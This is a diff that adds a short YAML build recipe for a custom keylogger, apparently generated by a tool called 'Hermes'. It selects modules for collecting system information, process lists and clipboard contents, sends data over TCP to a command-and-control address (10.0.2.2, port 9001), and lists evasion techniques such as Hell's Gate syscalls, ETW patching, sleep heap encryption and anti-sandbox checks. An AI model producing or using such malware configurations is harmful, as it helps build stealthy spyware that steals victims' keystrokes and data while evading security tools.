@@ -1,0 +1,27 @@
+name: keylogger_cs_custom_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info_api
+- collectors/processes
+- collectors/clipboard
+exfil: exfil/tcp_flush
+arch: arch/keylogger
+resources: true
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/hells_gate
+- evasion/recycled_gate
+- evasion/sleep_heap_encrypt
+- evasion/etw_patch
+- evasion/entropy_pad
+- evasion/anti_sandbox
+- evasion/behavioral_pacing
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
+  FLUSH_INTERVAL_MS: '30000'
+  BATCH_DURATION_MS: '30000'
